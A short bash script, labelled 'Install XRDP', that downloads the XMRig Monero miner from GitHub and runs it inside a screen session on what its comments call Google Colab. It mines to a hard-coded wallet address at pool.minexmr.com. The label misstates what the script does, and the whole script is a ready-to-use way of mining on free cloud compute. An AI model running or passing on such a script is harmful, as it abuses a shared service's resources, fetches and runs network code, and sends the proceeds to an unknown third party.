#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o pool.minexmr.com:4444 -u 42q97h148z54mt5QWSJZUHWhZiic3PD8aiqr8w7BWvKBStAU6JT58gXNrMA9fwu2xfijurDrPEgY92qHdipJLT88Abw9rLb.nice
